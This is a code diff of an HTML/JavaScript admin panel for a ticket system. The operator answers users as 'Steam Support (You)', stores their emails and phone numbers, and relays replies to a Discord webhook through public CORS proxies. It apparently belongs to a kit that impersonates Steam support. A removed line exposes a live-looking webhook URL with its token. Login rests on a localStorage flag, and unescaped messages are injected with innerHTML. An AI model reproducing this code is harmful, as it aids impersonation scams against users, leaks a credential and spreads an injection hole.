+                const sender = lastMsg ? (lastMsg.sender === 'user' ? 'User: ' : 'Support: ') : '';
                 
-                // Format date
-                const date = new Date(ticket.updated_at).toLocaleDateString();
-                const time = new Date(ticket.updated_at).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+                // Форматируем дату
+                const date = new Date(ticket.updated_at);
+                const timeStr = date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+                const dateStr = date.toLocaleDateString();
                 
                 card.innerHTML = `
-                    <div class="ticket-header">
+                    <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
                         <div class="ticket-id">${ticket.id}</div>
-                        <div class="ticket-status status-${ticket.status}">${ticket.status.toUpperCase()}</div>
+                        <div style="font-size: 11px; padding: 2px 6px; border-radius: 3px; background: ${getStatusColor(ticket.status)};">
+                            ${ticket.status.toUpperCase()}
+                        </div>
                     </div>
-                    <div class="ticket-info">
-                        <div><i class="fas fa-envelope"></i> ${ticket.email}</div>
-                        <div><i class="fas fa-phone"></i> ${ticket.phone}</div>
-                        <div><i class="fas fa-clock"></i> ${date} ${time}</div>
+                    <div style="font-size: 13px; margin-bottom: 5px; color: #66c0f4;">
+                        ${ticket.email}
                     </div>
-                    <div class="ticket-message">${messagePreview}</div>
-                    ${ticket.source === 'server' ? '<div style="margin-top: 5px;"><span style="font-size: 10px; color: #66c0f4;"><i class="fas fa-server"></i> From Server</span></div>' : ''}
+                    <div style="font-size: 12px; color: #8f98a0; margin-bottom: 8px;">
+                        ${dateStr} ${timeStr}
+                    </div>
+                    <div style="font-size: 12px; color: #c6d4df; font-style: italic;">
+                        ${sender}${messagePreview}
+                    </div>
+                    ${ticket.source === 'server' ? 
+                        '<div style="margin-top: 8px; font-size: 10px; color: #66c0f4;"><i class="fas fa-server"></i> From Server</div>' : 
+                        ''}
                 `;
                 
                 container.appendChild(card);
             });
         }
         
+        function getStatusColor(status) {
+            switch(status) {
+                case 'pending': return 'rgba(255, 184, 32, 0.2)';
+                case 'reviewed': return 'rgba(102, 192, 244, 0.2)';
+                case 'resolved': return 'rgba(92, 126, 16, 0.2)';
+                default: return 'rgba(42, 71, 94, 0.3)';
+            }
+        }
+        
         function selectTicket(ticketId) {
             selectedTicketId = ticketId;
             
-            // Update UI
+            // Сбрасываем выделение у всех
             document.querySelectorAll('.ticket-card').forEach(card => {
                 card.classList.remove('selected');
             });
             
+            // Выделяем выбранный
             const selectedCard = document.querySelector(`.ticket-card[onclick*="${ticketId}"]`);
             if (selectedCard) {
                 selectedCard.classList.add('selected');
             }
             
-            // Load ticket details
+            // Загружаем тикет
             const ticket = tickets.find(t => t.id === ticketId);
             if (ticket) {
-                showChatPanel(ticket);
+                showChat(ticket);
             }
         }
         
-        function showChatPanel(ticket) {
-            // Update chat header
+        function showChat(ticket) {
+            // Обновляем заголовок
             document.getElementById('chatTitle').textContent = ticket.email;
             document.getElementById('chatTicketId').textContent = ticket.id;
             document.getElementById('chatStatus').textContent = ticket.status;
-            document.getElementById('chatStatus').className = `status-${ticket.status}`;
             
-            // Update status select
+            // Устанавливаем статус
             document.getElementById('statusSelect').value = ticket.status;
             
-            // Show chat input area
+            // Показываем поле ввода
             document.getElementById('chatInputArea').style.display = 'block';
             
-            // Show messages
+            // Показываем сообщения
             displayMessages(ticket.messages || []);
-            
-            // Show chat panel (for mobile)
-            document.getElementById('chatPanel').classList.add('open');
-            document.getElementById('closeChatBtn').classList.remove('hidden');
-            
-            // Scroll to bottom
-            const chatMessages = document.getElementById('chatMessages');
-            setTimeout(() => {
-                chatMessages.scrollTop = chatMessages.scrollHeight;
-            }, 100);
-        }
-        
-        function closeChat() {
-            document.getElementById('chatPanel').classList.remove('open');
-            document.getElementById('closeChatBtn').classList.add('hidden');
-            selectedTicketId = null;
-            
-            // Reset UI
-            document.querySelectorAll('.ticket-card').forEach(card => {
-                card.classList.remove('selected');
-            });
-            
-            document.getElementById('chatMessages').innerHTML = `
-                <div class="empty-state">
-                    <i class="fas fa-comments"></i>
-                    <p>Select a ticket to view conversation</p>
-                </div>
-            `;
-            
-            document.getElementById('chatInputArea').style.display = 'none';
         }
         
         function displayMessages(messages) {
@@ -1013,29 +541,40 @@
                 const messageDiv = document.createElement('div');
                 
                 if (msg.sender === 'system') {
-                    messageDiv.className = 'message message-system';
-                    messageDiv.innerHTML = `<div class="message-content">${msg.message}</div>`;
+                    messageDiv.innerHTML = `
+                        <div style="text-align: center; padding: 5px; font-size: 11px; color: #8f98a0;">
+                            ${msg.message}
+                        </div>
+                    `;
                 } else {
-                    messageDiv.className = `message ${msg.sender === 'user' ? 'message-user' : 'message-admin'}`;
+                    const isUser = msg.sender === 'user';
+                    messageDiv.className = `message ${isUser ? 'message-user' : 'message-admin'}`;
                     
-                    const senderName = msg.sender === 'user' ? 'User' : 'Steam Support (You)';
+                    const sender = isUser ? 'User' : 'Steam Support (You)';
                     const time = new Date(msg.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
                     
                     messageDiv.innerHTML = `
-                        <div class="message-info">
-                            <span>${senderName}</span>
-                            <span>${time}</span>
+                        <div style="font-size: 11px; color: #8f98a0; margin-bottom: 3px;">
+                            ${sender} • ${time}
                         </div>
-                        <div class="message-content">${msg.message}</div>
+                        <div style="white-space: pre-wrap; font-size: 13px;">${msg.message}</div>
                     `;
                 }
                 
                 container.appendChild(messageDiv);
             });
+            
+            // Прокручиваем вниз
+            setTimeout(() => {
+                container.scrollTop = container.scrollHeight;
+            }, 100);
         }
         
         async function sendMessage() {
-            if (!selectedTicketId) return;
+            if (!selectedTicketId) {
+                alert('Please select a ticket first');
+                return;
+            }
             
             const messageInput = document.getElementById('messageInput');
             const message = messageInput.value.trim();
@@ -1046,11 +585,11 @@
                 return;
             }
             
-            // Find ticket
+            // Находим тикет
             const ticketIndex = tickets.findIndex(t => t.id === selectedTicketId);
             if (ticketIndex === -1) return;
             
-            // Add message
+            // Добавляем сообщение
             const newMessage = {
                 sender: 'support',
                 message: message,
@@ -1061,58 +600,48 @@
             tickets[ticketIndex].status = newStatus;
             tickets[ticketIndex].updated_at = new Date().toISOString();
             
-            // Save to localStorage
+            // Сохраняем локально
             localStorage.setItem('steam_tickets', JSON.stringify(tickets));
             
-            // Update UI
+            // Обновляем UI
             displayMessages(tickets[ticketIndex].messages);
             document.getElementById('chatStatus').textContent = newStatus;
-            document.getElementById('chatStatus').className = `status-${newStatus}`;
             
-            // Clear input
+            // Очищаем поле ввода
             messageInput.value = '';
             
-            // Send to server if online
-            if (isApiOnline) {
+            // Пытаемся отправить на сервер
+            if (currentApiStatus) {
                 try {
-                    // Send message
-                    await fetch(`${API_SERVER}?action=add_message&ticket_id=${selectedTicketId}`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            sender: 'support',
-                            message: message
-                        })
-                    });
+                    // Отправляем сообщение
+                    await apiRequest('add_message', {
+                        sender: 'support',
+                        message: message
+                    }, selectedTicketId);
                     
-                    // Update status
-                    await fetch(`${API_SERVER}?action=update_status&ticket_id=${selectedTicketId}`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            status: newStatus
-                        })
-                    });
+                    // Обновляем статус
+                    await apiRequest('update_status', {
+                        status: newStatus
+                    }, selectedTicketId);
+                    
+                    console.log('Message sent to server successfully');
                     
                 } catch (error) {
-                    console.log('Failed to send to server');
+                    console.log('Failed to send to server, saved locally');
                 }
             }
             
-            // Send Discord notification
+            // Отправляем Discord уведомление
             sendDiscordNotification(tickets[ticketIndex], message);
             
-            // Refresh tickets list
+            // Обновляем список тикетов
             renderTickets();
             updateStats();
         }
         
         function sendDiscordNotification(ticket, message) {
-            const webhookUrl = 'https://discord.com/api/webhooks/1465641089146032221/rwlhhe7jcZArcETKrbODEsd7FbEc_02I4BoSG9pYsnlKusnGAA-X3MmfnZePitANlSAk';
+            // Используем тот же вебхук что и index.html
+            const webhookUrl = API_CONFIG.discordWebhook;
             
             const discordMessage = {
                 content: `**📨 ADMIN RESPONSE**\n` +
@@ -1123,43 +652,40 @@
                         `**Time:** ${new Date().toLocaleString()}`
             };
             
-            fetch(webhookUrl, {
+            // Пытаемся отправить через прокси
+            fetch('https://corsproxy.io/?' + encodeURIComponent(webhookUrl), {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify(discordMessage)
-            }).catch(() => {});
-        }
-        
-        function refreshTickets() {
-            const btn = event.target;
-            const originalText = btn.innerHTML;
-            
-            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Refreshing...';
-            btn.disabled = true;
-            
-            checkApiStatus().then(() => {
-                loadTickets();
-                
-                setTimeout(() => {
-                    btn.innerHTML = originalText;
-                    btn.disabled = false;
-                }, 1000);
+            }).catch(() => {
+                // Пробуем другой прокси
+                fetch('https://api.allorigins.win/raw?url=' + encodeURIComponent(webhookUrl), {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(discordMessage)
+                }).catch(() => {
+                    console.log('Discord notification failed');
+                });
             });
         }
         
-        // Auto-refresh every 60 seconds
+        // Авто-обновление каждые 30 секунд
         setInterval(() => {
             if (localStorage.getItem('steam_admin_logged_in') === 'true') {
-                checkApiStatus();
+                checkApiConnection();
                 loadTickets();
             }
-        }, 60000);
+        }, 30000);
         
-        // Initialize on load
+        // Проверяем подключение при загрузке
         if (localStorage.getItem('steam_admin_logged_in') === 'true') {
-            showAdminPanel();
+            checkApiConnection().then(() => {
+                console.log('Initial API check complete');
+            });
         }
     </script>
 </body>
